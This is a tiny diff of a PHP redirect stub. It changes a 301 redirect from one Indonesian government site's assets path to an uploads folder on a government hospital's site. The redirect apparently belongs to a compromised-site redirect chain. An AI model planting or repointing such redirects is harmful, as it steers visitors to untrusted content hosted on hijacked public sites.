@@ -1,4 +1,4 @@
 <?php
-header("Location: https://dlh.oganilirkab.go.id/assets/pro/", true, 301);
+header("Location: http://sismadak.rsudrsoetomo.jatimprov.go.id/uploads/file/", true, 301);
 exit();
 ?>
